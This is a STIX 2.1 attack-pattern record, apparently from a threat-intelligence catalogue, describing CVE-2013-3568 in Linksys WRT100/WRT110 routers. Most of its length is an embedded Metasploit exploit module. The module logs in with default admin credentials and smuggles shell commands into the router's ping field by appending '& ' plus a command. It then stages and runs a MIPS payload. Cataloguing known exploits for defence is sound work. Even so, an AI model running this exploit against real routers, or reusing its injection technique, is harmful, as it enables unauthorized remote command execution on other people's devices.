{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2fb1a294-c476-4bf9-8b0b-0ba606205cae",
    "created": "2024-08-14T17:04:27.573278Z",
    "modified": "2024-08-14T17:04:27.573282Z",
    "name": "Linksys Devices pingstr Remote Command Injection",
    "description": " The Linksys WRT100 and WRT110 consumer routers are vulnerable to a command injection exploit in the ping field of the web interface. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/linksys_wrt110_cmd_exec.rb",
            "external_id": "linksys_wrt110_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3568"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2013/Jul/78"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Linksys Devices pingstr Remote Command Injection',\n      'Description' => %q{\n        The Linksys WRT100 and WRT110 consumer routers are vulnerable to a command\n        injection exploit in the ping field of the web interface.\n      },\n      'Author'      =>\n        [\n          'Craig Young', # Vulnerability discovery\n          'joev', # msf module\n          'juan vazquez' # module help + echo cmd stager\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2013-3568'],\n          ['BID', '61151'],\n          ['URL', 'https://seclists.org/bugtraq/2013/Jul/78']\n        ],\n      'DisclosureDate' => '2013-07-12',\n      'Privileged'     => true,\n      'Platform'       => ['linux'],\n      'Arch'           => ARCH_MIPSLE,\n      'Targets'        =>\n        [\n            ['Linux mipsel Payload', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      ))\n\n    register_options([\n      OptString.new('HttpUsername', [ true, 'Valid router administrator username', 'admin']),\n      OptString.new('HttpPassword', [ true, 'Password to login with', 'admin']),\n      OptAddress.new('RHOST', [true, 'The address of the router', '192.168.1.1']),\n      OptInt.new('TIMEOUT', [false, 'The timeout to use in every request', 20])\n    ])\n    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri' => '/HNAP1/'\n      })\n    rescue ::Rex::ConnectionError\n      vprint_error(\"A connection error has occurred\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res and res.code == 200 and res.body =~ /<ModelName>WRT110<\\/ModelName>/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    test_login\n\n    execute_cmdstager({:flavor => :echo})\n  end\n\n  # Sends an HTTP request with authorization header to the router\n  # Raises an exception unless the login is successful\n  def test_login\n    print_status(\"#{rhost}:#{rport} - Trying to login with #{user}:#{pass}\")\n\n    res = send_auth_request_cgi({\n      'uri' => '/',\n      'method' => 'GET'\n    })\n\n    if not res or res.code == 401 or res.code == 404\n      fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - Could not login with #{user}:#{pass}\")\n    else\n      print_good(\"#{rhost}:#{rport} - Successful login #{user}:#{pass}\")\n    end\n  end\n\n  # Run the command on the router\n  def execute_command(cmd, opts)\n    send_auth_request_cgi({\n      'uri' => '/ping.cgi',\n      'method' => 'POST',\n      'vars_post' => {\n         'pingstr' => '& ' + cmd\n      }\n    })\n\n    Rex.sleep(1) # Give the device a second\n  end\n\n  # Helper methods\n  def user\n    datastore['HttpUsername']\n  end\n\n  def pass\n    datastore['HttpPassword'] || ''\n  end\n\n  def send_auth_request_cgi(opts={}, timeout=nil)\n    timeout ||= datastore['TIMEOUT']\n    opts.merge!('authorization' => basic_auth(user, pass))\n    begin\n      send_request_cgi(opts, timeout)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Could not connect to the webservice\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-07-12",
    "x_mitre_platforms": [
        "['linux']"
    ]
}